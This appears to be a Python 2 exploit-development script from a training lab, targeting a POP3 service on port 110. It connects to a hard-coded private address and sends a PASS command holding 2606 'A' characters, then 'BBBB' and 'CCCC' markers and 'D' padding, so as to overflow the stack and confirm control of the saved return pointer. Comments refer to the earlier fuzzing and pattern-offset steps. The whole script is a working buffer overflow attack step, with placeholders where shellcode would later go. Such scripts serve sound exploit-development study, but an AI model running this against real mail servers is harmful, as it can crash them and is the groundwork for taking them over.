#!/usr/bin/env python  
import socket  
RHOST = "10.11.12.36"
RPORT = 110 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
s.connect((RHOST, RPORT))
s.recv(1024)
 
buf_totlen = 2700 #get this from fuzzing
offset_srp = 2606 #get this from pattern_offset

buf = ''
buf += 'A'*(offset_srp-len(buf))
buf += "BBBB"
buf += "CCCC"
buf += "D"*(buf_totlen-len(buf))

s.send('USER username' +'\r\n')
s.recv(1024)  
s.send('PASS ' + buf + '\r\n') 
